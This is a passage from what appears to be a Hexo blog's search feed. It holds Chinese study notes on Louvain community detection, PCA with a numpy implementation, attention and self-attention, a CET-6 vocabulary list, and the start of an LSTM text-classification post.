class="token punctuation">,</span>                        node_size<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>                       cmap<span class="token operator">=</span>cmap<span class="token punctuation">,</span>                        node_color<span class="token operator">=</span>list<span class="token punctuation">(</span>partition<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                      <span class="token punctuation">)</span>nx<span class="token punctuation">.</span>draw_networkx_edges<span class="token punctuation">(</span>G<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230112120021.png" alt="image-20230112120021301"></p><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://blog.csdn.net/weixin_39419040/article/details/127085401">https://blog.csdn.net/weixin_39419040/article/details/127085401</a></p><p><a href="https://zhuanlan.zhihu.com/p/556291759">万物皆网络，万字长文详解社区发现算法Louvain - 知乎 (zhihu.com)</a></p><p><a href="https://www.statworx.com/en/content-hub/blog/community-detection-with-louvain-and-infomap/">使用鲁汶和信息地图进行社区检测 (statworx.com)</a></p><p><a href="https://blog.csdn.net/weixin_39419040/article/details/127085401">(27条消息) louvain算法_呔 小怪兽休走的博客-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/556291759">万物皆网络，万字长文详解社区发现算法Louvain - 知乎 (zhihu.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 社区划分 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PCA:主成分析</title>
      <link href="/2022/12/07/PCA/"/>
      <url>/2022/12/07/PCA/</url>
      
        <content type="html"><![CDATA[<h1 id="PCA-主成分析"><a href="#PCA-主成分析" class="headerlink" title="PCA:主成分析"></a>PCA:主成分析</h1><h2 id="1-PCA来源及作用"><a href="#1-PCA来源及作用" class="headerlink" title="1.PCA来源及作用"></a>1.PCA来源及作用</h2><h3 id="1-1-存在问题"><a href="#1-1-存在问题" class="headerlink" title="1.1 存在问题"></a>1.1 存在问题</h3><p>在我们训练模型的过程中，有时会出现在**<code>训练集上误差较小</code><strong>，但到了<code>测试集误差又较大</code>，我们称之为</strong><code>泛化误差</code>**，造成这种现象往往是以下几个原因：</p><ul><li>训练数据不足</li><li>训练集与测试集数据分布不同</li><li><strong><code>特征维度过高</code>，造成过拟合</strong></li></ul><h3 id="1-2-解决办法"><a href="#1-2-解决办法" class="headerlink" title="1.2 解决办法"></a>1.2 解决办法</h3><ul><li><p>增加样本数量</p></li><li><p>使用正则项</p></li><li><p>对数据进行降维对<code>数据进行降维</code>可以进行<code>人工特征筛选</code>，但往往费时又费力，效果还有可能不好。</p><p>因此我们可以采用一些<code>模型来进行数据降维</code>，其中比较常用的就是<code>PCA(Principal Component Analysis)，即主成分分析</code></p></li></ul><h2 id="2-什么是PCA"><a href="#2-什么是PCA" class="headerlink" title="2.什么是PCA"></a>2.什么是PCA</h2><p>主成分分析（PCA），<strong>一种无监督算法</strong>，即它<strong>不需要依靠任何类别标签的信息，</strong>是一种常用的<strong>线性降维方法</strong>。</p><p>该算法的目标是<strong>通过某种线性投影</strong>，将原本<strong>高维空间中的一些数据，映射到更低维度的空间中</strong>，并在所<strong>投影的维度上</strong>满足：<strong>1.尽可能保留原始数据的信息</strong>。<strong>2.新维度下变量间两两各不相关</strong>。</p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210195843.png" alt="image-20221210195843175"></p><h2 id="3-PCA算法步骤"><a href="#3-PCA算法步骤" class="headerlink" title="3.PCA算法步骤"></a>3.PCA算法步骤</h2><ol><li><p><strong>对所有特征进行中心化：去均值(使得每一变量的均值为0)</strong></p></li><li><p><strong>计算协方差矩阵</strong> </p></li><li><p><strong>计算协方差矩阵的特征值和特征向量</strong></p></li><li><p> <strong>将特征值排序</strong> </p></li><li><p><strong>保留前N个最大的特征值对应的特征向量</strong></p></li><li><p> <strong>将原始特征转换到上面得到的N个特征向量构建的新空间中</strong></p></li></ol><p><strong><code>重点：5，6实现了特征压缩</code></strong></p><h2 id="4-PCA-例子"><a href="#4-PCA-例子" class="headerlink" title="4. PCA 例子"></a>4. PCA 例子</h2><blockquote><ol><li>数据示例</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210201742.png" alt="image-20221210201742170"></p><blockquote><ol start="2"><li>对所有特征进行中心化：去均值</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210201830.png" alt="image-20221210201830830"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210193048.png" alt="image-20221210193048004"></p><blockquote><ol start="3"><li>求协方差矩阵C</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210202404.png" alt="image-20221210202404285"></p><p><code>C的维度是m ∗ m维的，m 为特征的数量。</code></p><p> 　<strong>上述矩阵中，对角线上分别是特征x1和x2的方差，非对角线上的是协方差。协方差大于0，表示x1和x2正相关，小于0表示负相关，等于0，互相独立。协方差绝对值越大，两者对彼此的影响越大，反之越小。</strong></p><p><strong><code>重点：</code></strong></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210202036.png"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210202258.png" alt="image-20221210202258915"></p><p><code>解释：为什么除以n-1 而不是n:</code></p><p>这样能使我们<strong>以较小的样本集更好的逼近总体的标准差</strong>，即统计上<strong>所谓的“无偏估计”</strong></p><blockquote><ol start="4"><li>求协方差矩阵C的特征值和相对应的特征向量</li></ol></blockquote><p>利用线性代数的知识，求<code>协方差矩阵 C 的特征值 λ 和相对应的特征向量 u （每一个特征值对应一个特征向量</code>）公式如下:</p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210203104.png" alt="image-20221210203104733"></p><p>将特征值 <strong>λ 按照从大到小的顺序排序，选择最大的前k个</strong>。</p><p>并将其相对应的k个特征向量拿出来，我们会得到一组{ ( λ 1 ， u 1 ) ， ( λ 2 ， u 2 ) ， . . . ， ( λ k ， u k ) } 。</p><p>本例中原始特征只有2维，我在选取 λ 的时候，令k = 1，选择最大的λ 1 和 其 对 应 的 u 1 。</p><p><strong>重点</strong>：<code>降低的维度k&lt;M   k:所降低到的维度  M：特征数量个数</code></p><blockquote><ol start="5"><li>将原始特征投影到选取的特征向量上，得到降维后的新K维特征</li></ol></blockquote><p><strong>特征值从大到小排列</strong>，如果要将数据从<code>M维投影至k 维</code>，我们取<code>前k 个特征值对应的特征向量</code>，并且将其<code>标准化</code>，使得<code>每个特征向量的模为1</code>，将其从<code>上到下按行排列构成特征矩阵P .</code><br><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210204514.png" alt="image-20221210204514282"></p><p>投影后的的特征为Y**<code>（Y降维后的数据 ）</code>**：</p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210204719.png" alt="image-20221210204719724"></p><blockquote><ol start="6"><li>最大熵理论</li></ol></blockquote><p>​     <strong>方差越大，信息量就越大</strong>。<strong>协方差矩阵的每一个特征向量就是一个投影面</strong>，<strong>每一个特征向量所对应的特征值就是原始特征投影到这个投影面之后的方差</strong>。<strong>由于投影过去之后，我们要尽可能保证信息不丢失，所以要选择具有较大方差的投影面对原始特征进行投影，也就是选择具有较大特征值的特征向量。然后将原始特征投影在这些特征向量上，投影后的值就是新的特征值。每一个投影面生成一个新的特征，k个投影面就生成k个新特征</strong>。</p><p>“**<code>协方差矩阵C的最大K个特征值所对应的特征向量”上的投影就是k维理想特征</code>**</p><p><code>那为什么协方差矩阵的特征向量可以看做是投影面，相对应的特征值是原始特征投影到这个投影面之后的方差？</code></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210205648.png" alt="image-20221210205648262"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210205659.png" alt="image-20221210205659456"></p><p>根据方差最大理论，选择投影过去之后，样本方差最大的那条投影直线作为投影维度，对原始特征进行降维。经过计算，u 1 比较好，因为投影后的样本点之间方差最大</p><h2 id="5-PCA代码实现"><a href="#5-PCA代码实现" class="headerlink" title="5.PCA代码实现"></a>5.PCA代码实现</h2><blockquote><ol><li>实现PCA </li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">class</span> <span class="token class-name">PCA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 计算协方差矩阵</span>    <span class="token keyword">def</span> <span class="token function">calc_cov</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> X<span class="token punctuation">)</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> X<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 数据标准化，X的每列减去列均值</span>        X <span class="token operator">=</span> <span class="token punctuation">(</span>X <span class="token operator">-</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>X<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">/</span> m <span class="token operator">*</span> np<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>X<span class="token punctuation">.</span>T<span class="token punctuation">,</span> X<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">pca</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> X<span class="token punctuation">,</span> n_components<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 计算协方差矩阵</span>        cov_matrix <span class="token operator">=</span> self<span class="token punctuation">.</span>calc_cov<span class="token punctuation">(</span>X<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 计算协方差矩阵的特征值和对应特征向量</span>        eigenvalues<span class="token punctuation">,</span> eigenvectors <span class="token operator">=</span> np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>eig<span class="token punctuation">(</span>cov_matrix<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 对特征值排序x</span>        idx <span class="token operator">=</span> eigenvalues<span class="token punctuation">.</span>argsort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 取最大的前n_component组</span>        eigenvectors <span class="token operator">=</span> eigenvectors<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> idx<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#按特征值大小，从大到小排序</span>        eigenvectors <span class="token operator">=</span> eigenvectors<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>n_components<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#选取前 n_components 组特征向量</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eigenvectors.shape = \n"</span><span class="token punctuation">,</span>eigenvectors<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eigenvectors = \n"</span><span class="token punctuation">,</span>eigenvectors<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#一个特征向量是一列</span>        <span class="token comment" spellcheck="true"># Y=PX转换</span>        <span class="token keyword">return</span> np<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>X<span class="token punctuation">,</span> eigenvectors<span class="token punctuation">)</span></code></pre><blockquote><ol start="2"><li>导入数据</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> sklearn <span class="token keyword">import</span> datasets<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment" spellcheck="true"># 导入sklearn数据集</span>iris <span class="token operator">=</span> datasets<span class="token punctuation">.</span>load_iris<span class="token punctuation">(</span><span class="token punctuation">)</span>X <span class="token operator">=</span> iris<span class="token punctuation">.</span>datay <span class="token operator">=</span> iris<span class="token punctuation">.</span>target<span class="token keyword">print</span><span class="token punctuation">(</span>X<span class="token punctuation">.</span>shape<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 150个样本 每个样本数据特征数为4</span></code></pre><blockquote><ol start="3"><li>PCA 降维并可视化</li></ol></blockquote><pre><code># 将数据降维到3个主成分X_trans = PCA().pca(X, 3)# 颜色列表colors = [&#39;navy&#39;, &#39;turquoise&#39;, &#39;darkorange&#39;]# 绘制不同类别for c, i, target_name in zip(colors, [0,1,2], iris.target_names):    plt.scatter(X_trans[y == i, 0], X_trans[y == i, 1],color=c, lw=1, label=target_name)# 添加图例plt.legend()plt.show()</code></pre><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221210210440.png" alt="image-20221210210440734"></p><h2 id="6-PCA-总结"><a href="#6-PCA-总结" class="headerlink" title="6. PCA 总结"></a>6. PCA 总结</h2><h3 id="6-1-优点"><a href="#6-1-优点" class="headerlink" title="6.1 优点"></a>6.1 优点</h3><ol><li>以方差衡量信息的无监督学习，不受样本标签限制。</li><li>由于协方差矩阵对称，因此k个特征向量之间两两正交，也就是各主成分之间正交，正交就肯定线性不相关，可消除原始数据成分间的相互影响</li><li>可减少指标选择的工作量</li><li>用少数指标代替多数指标，利用PCA降维是最常用的算法</li><li>计算方法简单，易于在计算机上实现。</li></ol><h3 id="6-2-缺点"><a href="#6-2-缺点" class="headerlink" title="6.2 缺点"></a>6.2 缺点</h3><ol><li>主成分解释其含义往往具有一定的模糊性，不如原始样本完整</li><li>贡献率小的主成分往往可能含有对样本差异的重要信息，也就是可能对于区分样本的类别（标签）更有用</li><li>特征值矩阵的正交向量空间是否唯一有待讨论</li></ol><h2 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7.参考链接"></a>7.参考链接</h2><p><a href="https://www.cnblogs.com/BlairGrowing/p/15853516.html">chapter18——PCA实现 - 加微信X466550探讨 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/99kol/p/16693306.html">PCA原理及其代码实现 - 99号的格调 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.bilibili.com/video/BV1E5411E71z/?spm_id_from=333.337.search-card.all.click&vd_source=5e8f069711510b3788382a0a03ff38e5">用最直观的方式告诉你：什么是主成分分析PCA_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>注意力机制</title>
      <link href="/2022/12/01/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"/>
      <url>/2022/12/01/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Attention-注意力机制"><a href="#Attention-注意力机制" class="headerlink" title="Attention(注意力机制)"></a>Attention(注意力机制)</h1><h2 id="1-生物学背景"><a href="#1-生物学背景" class="headerlink" title="1.生物学背景"></a>1.生物学背景</h2><p><strong>视觉注意力机制</strong>是<strong>人类视觉所特有的大脑信号处理机制</strong>。人类视觉通过<strong>快速扫描全局图像</strong>，获得<strong>需要重点关注的目标区域</strong>，也就是一般所说的<strong>注意力焦点</strong>，而后对<strong>这一区域投入更多注意力资源</strong>，以<strong>获取</strong>更多所需要关注<strong>目标的细节信息</strong>，抑制其他无用信息。这是<strong>人类利用有限的注意力资源从大量信息中快速筛选出高价值信息的手段</strong>，是人类在长期进化中形成的一种生存机制，<strong>人类视觉注意力</strong>机制极大地<strong>提高</strong>了<strong>视觉信息处理的效率与准确性</strong>。</p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201102911.png" alt="image-20221201102910929"></p><h2 id="2-为什么需要-Attention"><a href="#2-为什么需要-Attention" class="headerlink" title="2.为什么需要 Attention"></a>2.为什么需要 Attention</h2><h3 id="1-简化模型，加速计算"><a href="#1-简化模型，加速计算" class="headerlink" title="1.简化模型，加速计算"></a>1.简化模型，加速计算</h3><p>当我们看到一幅图片时，先是快速扫过图片，然后锁定需要重点关注的目标区域。比如当我们观察上述图片时，注意力很容易就集中在了人脸、文章标题和文章首句等位置。</p><p>如果每个局部信息都不放过，那么必然耗费很多精力，不利于人类的生存进化。同样地，在深度学习网络中引入类似的机制，可以<strong>简化模型，加速计算</strong>。</p><p><code>减小处理高维输入数据的计算负担，通过结构化选取输入的子集，降低数据维度</code>。</p><h3 id="2-解决长距离记忆问题"><a href="#2-解决长距离记忆问题" class="headerlink" title="2.解决长距离记忆问题"></a>2.解决长距离记忆问题</h3><p><strong>序列输入时，随着序列的不断增长，原始根据时间步的方式的表现越来越差</strong>，这是由于原始的时间步模型设计结构有缺陷，<strong>所有的上下文输入信息都被限制到固定长度</strong>，整个模型的能力同样受到限制。</p><p>参考博客：</p><p><a href="https://www.cnblogs.com/MarkL124950/articles/16771819.html">注意力机制 - MarkL124950 - 博客园 (cnblogs.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/379722366">详解深度学习中的注意力机制（Attention） - 知乎 (zhihu.com)</a></p><h2 id="3-如何实现注意力机制"><a href="#3-如何实现注意力机制" class="headerlink" title="3.如何实现注意力机制"></a>3.如何实现注意力机制</h2><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201124140.png" alt="image-20221201124140804"></p><h3 id="1-本质思想"><a href="#1-本质思想" class="headerlink" title="1.本质思想"></a>1.本质思想</h3><p>首先我们得明确一个点，<strong>注意力模型</strong>从<strong>大量信息 Values</strong> 中<strong>筛选出少量重要信息</strong>，这些<strong>重要信息</strong>一定是相<strong>对</strong>于另外一个信息 <strong>Query</strong> 而言是<strong>重要</strong>的，通过 Query 这个信息从 Values 中筛选出重要信息。</p><p> Query 这个信息从 Values 中筛选出重要信息，简单点说<code>就是计算 Query 和 Values 中每个信息的相关程度</code></p><h3 id="2-注意力计算步骤"><a href="#2-注意力计算步骤" class="headerlink" title="2.注意力计算步骤"></a>2.注意力计算步骤</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201125318.png" alt="注意力计算过程"></p><p>Attention 通常可以进行如下描述，表示为将 Query(Q) 和 key-value pairs（<strong>把 Values 拆分成了键值对的形式</strong>） 映射到输出上，其中 query、每个 key、每个 value 都是向量，输出是 V 中所有 values 的加权，其中权重是由 Query 和每个 key 计算出来的。</p><blockquote><ol><li>计算相似度</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201124751.png" alt="image-20221201124751917"></p><p><strong>两个向量点乘的几何意义是一个向量在另一个向量上的投影</strong><br><strong>更进一步地，值越大，可以认为两个向量的相关度越高。</strong></p><blockquote><ol start="2"><li>归一化和缩放</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201124820.png" alt="image-20221201124820908"></p><pre><code>51， 49---》 0.51，0.49两个数值差值越大，归一化结果更大，差值越小，归一化结果更小80，20--》 0.9999999999， 0.000000000180/10 20/1010 / 2 --&gt; 0.9, 0.1</code></pre><blockquote><ol start="3"><li>计算attention</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201124847.png" alt="image-20221201124847833"></p><p>参考博客：<a href="https://www.cnblogs.com/nickchen121/p/16470569.html">00 预训练语言模型的前世今生（全文 24854 个词） - 二十三岁的有德 - 博客园 (cnblogs.com)</a></p><h2 id="4-self-attention-自注意力机制"><a href="#4-self-attention-自注意力机制" class="headerlink" title="4.self-attention (自注意力机制)"></a>4.self-attention (自注意力机制)</h2><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201142403.png" alt="image-20221201142403605"></p><blockquote><ol><li>线性变换Q,K,V</li></ol></blockquote><p> Self Attention 有三个输入 Q、K、V：<strong>对于 Self Attention，Q、K、V 来自句子 X 的 词向量 x 的线性转化，即对于词向量 X，给定三个可学习的矩阵参数 WQ,Wk,Wv,X 分别右乘上述矩阵得到 Q、K、V</strong>。X</p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201145325.png" alt="image-20221201145325415"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201145534.png" alt="image-20221201145533966"></p><blockquote><ol start="2"><li>Matual</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201145832.png" alt="相似度计算"></p><blockquote><ol start="3"><li>Scale + Softmax</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201150313.png" alt="image-20221201150313201"></p><blockquote><ol start="4"><li>MatMul</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201150557.png"></p><p><strong>z1表示的就是 thinking 的新的向量表示</strong>。<strong>对于 thinking，初始词向量为x1</strong>，现在我通过 thinking machines 这句话去查询这句话里的<strong>每一个单词和 thinking 之间的相似度</strong>，<strong>新的z1依然是 thinking 的词向量表示</strong>，只不过这个<strong>词向量</strong>的表示<strong>蕴含了 thinking machines</strong> 这句话对于 thinking 而言<strong>哪个更重要的信息</strong>。</p><blockquote><ol start="5"><li>流程图</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201142830.png" alt="image-20221201142830099"></p><h2 id="5-Self-Attention-和-RNN、LSTM-的区别"><a href="#5-Self-Attention-和-RNN、LSTM-的区别" class="headerlink" title="5. Self Attention 和 RNN、LSTM 的区别"></a>5. Self Attention 和 RNN、LSTM 的区别</h2><ul><li>RNN、LSTM：需要依次序列计算，对于远距离的相互依赖的特征，<strong>要经过若干时间步步骤的信息累积才能将两者联系起来，而距离越远，有效捕获的可能性越小</strong>。由于处理的时序问题，必须<strong>计算出前面的信息</strong>，<strong>才能计算后面的内容</strong>，导致<strong>计算只能串行，不能并行。</strong></li></ul><ul><li>Self Attention：<ul><li>引入 Self Attention 后会更容易捕获句子中长距离的相互依赖的特征，<strong>因为 Self Attention 在计算过程中会直接将句子中任意两个单词的联系通过一个计算步骤直接联系起来，所以远距离依赖特征之间的距离被极大缩短，有利于有效地利用这些特征</strong>；</li><li>Self-Attention 对于<strong>一句话中的每个单词都可以单独的进行 Attention 值的计算</strong>，也就是说 <strong>Self Attention</strong> 对计算的<strong>并行性</strong>也有直接帮助作用，而对于必须得依次序列计算的 RNN 而言，是无法做到并行计算的。</li></ul></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/nickchen121/p/16470569.html#tid-Ph8Cd4">00 预训练语言模型的前世今生（全文 24854 个词） - 二十三岁的有德 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/nickchen121/p/16470711.html">10 Self-Attention（自注意力机制） - 二十三岁的有德 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>视频</title>
      <link href="/2022/11/29/%E8%A7%86%E9%A2%91/"/>
      <url>/2022/11/29/%E8%A7%86%E9%A2%91/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>六级词汇</title>
      <link href="/2022/11/21/%E5%85%AD%E7%BA%A7%E8%AF%8D%E6%B1%87/"/>
      <url>/2022/11/21/%E5%85%AD%E7%BA%A7%E8%AF%8D%E6%B1%87/</url>
      
        <content type="html"><![CDATA[<h1 id="六级词汇"><a href="#六级词汇" class="headerlink" title="六级词汇"></a>六级词汇</h1><h2 id="1-医疗健康"><a href="#1-医疗健康" class="headerlink" title="1. 医疗健康"></a>1. 医疗健康</h2><ol><li>According to :根据</li><li>disease:疾病 –illness–sickness – plague瘟疫  pandemic–epidemic </li><li>all over the world :全世界</li><li>kidney:肾脏</li><li>diabetes：糖尿病</li><li>obesity :肥胖症</li><li>ignore:不理人 忽视 ignorance 无知</li><li>serious: 认真 严重</li><li>sign :信号  标志signal </li><li>while -although-even though -though 但是</li><li>negative –pessimistic:消极</li><li>positive– optimistic：积极</li><li>physical :物理</li><li>physician:内科医生  surgeon:外科医生</li><li>deficiency:缺乏不足</li><li>account for :占… ,</li><li>famine:饥荒 饥饿 </li><li>fragile:脆弱  vulnerable 脆弱 delicate</li></ol><p><video src="https://gitee.com/hexofox/foximage/raw/master/%E5%8D%8A%E5%8F%AA%F0%9F%A6%8A.mp4"></video></p>]]></content>
      
      
      
        <tags>
            
            <tag> 六级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LSTM</title>
      <link href="/2022/11/19/LSTM/"/>
      <url>/2022/11/19/LSTM/</url>
      
        <content type="html"><![CDATA[<h1 id="长短期记忆网络：LSTM"><a href="#长短期记忆网络：LSTM" class="headerlink" title="长短期记忆网络：LSTM"></a>长短期记忆网络：LSTM</h1><h2 id="LSTM先验知识"><a href="#LSTM先验知识" class="headerlink" title="LSTM先验知识"></a>LSTM先验知识</h2><h3 id="1-为什么会出现LSTM"><a href="#1-为什么会出现LSTM" class="headerlink" title="1. 为什么会出现LSTM"></a>1. 为什么会出现LSTM</h3><ul><li>解决传统RNN的记忆长度的问题</li></ul><p>对于<strong>传统的<a href="https://so.csdn.net/so/search?q=RNN&spm=1001.2101.3001.7020">RNN</a>网络</strong>来说，它会出现的一个问题就是：它的<strong>Memory记忆的时间序列会比较短</strong>，比如说当你去翻译一句话的时候，你可能一次只能记住3个语境相关的单词。</p><ul><li><p>解决梯度离散的问题</p><p>参考链接：<a href="https://blog.csdn.net/qq_38147421/article/details/107692418">(20条消息) LSTM原理详解_yanglee0的博客-CSDN博客</a></p></li></ul><h2 id="LSTM-结构详解"><a href="#LSTM-结构详解" class="headerlink" title="LSTM 结构详解"></a>LSTM 结构详解</h2><h3 id="1-LSTM和RNN-结构区别"><a href="#1-LSTM和RNN-结构区别" class="headerlink" title="1.LSTM和RNN 结构区别"></a>1.LSTM和RNN 结构区别</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221119102510.png" alt="image-20221119102510674"></p><h3 id="2-LSTM-3D结构到平面"><a href="#2-LSTM-3D结构到平面" class="headerlink" title="2.LSTM 3D结构到平面"></a>2.LSTM 3D结构到平面</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221119102612.png" alt="image-20221119102612567"></p><h3 id="3-LSTM-结构"><a href="#3-LSTM-结构" class="headerlink" title="3. LSTM 结构"></a>3. LSTM 结构</h3><blockquote><ol><li>完整的LSTM</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221119120931.png" alt="image-20221119120931508"></p><blockquote><ol start="2"><li>单个LSTM单元结构</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221119121007.png" alt="image-20221119121007072"></p><blockquote><ol start="3"><li>遗忘门</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221119180032.png" alt="image-20221119180032322"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201205053.png" alt="image-20221201205053823"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221119182527.png" alt="image-20221119182527651"></p><blockquote><ol start="4"><li>更新门</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221119182652.png" alt="image-20221119182652326"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201205119.png" alt="image-20221201205119907"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221119182901.png" alt="image-20221119182901153"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201205136.png" alt="image-20221201205136664"></p><blockquote><ol start="5"><li>输出门</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221119183712.png" alt="image-20221119183712013"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201205158.png" alt="image-20221201205158686"></p><h2 id="LSTM-B站视频弹幕二分类"><a href="#LSTM-B站视频弹幕二分类" class="headerlink" title="LSTM:B站视频弹幕二分类"></a>LSTM:B站视频弹幕二分类</h2><blockquote><ol><li>导入库</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> gensim<span class="token punctuation">.</span>models <span class="token keyword">import</span> Word2Vec<span class="token keyword">from</span> keras<span class="token punctuation">.</span>preprocessing <span class="token keyword">import</span> sequence<span class="token keyword">from</span> keras <span class="token keyword">import</span> utils<span class="token keyword">from</span> keras <span class="token keyword">import</span> utils <span class="token keyword">as</span> np_utils<span class="token keyword">from</span> keras<span class="token punctuation">.</span>models <span class="token keyword">import</span> Sequential<span class="token keyword">from</span> keras<span class="token punctuation">.</span>models <span class="token keyword">import</span> model_from_yaml<span class="token keyword">from</span> keras<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>embeddings <span class="token keyword">import</span> Embedding<span class="token keyword">from</span> keras<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>recurrent <span class="token keyword">import</span> LSTM<span class="token keyword">from</span> keras<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>core <span class="token keyword">import</span> Dense<span class="token punctuation">,</span> Dropout<span class="token punctuation">,</span> Activation<span class="token keyword">from</span> keras<span class="token punctuation">.</span>optimizers <span class="token keyword">import</span> Adam<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>model_selection <span class="token keyword">import</span> train_test_split<span class="token 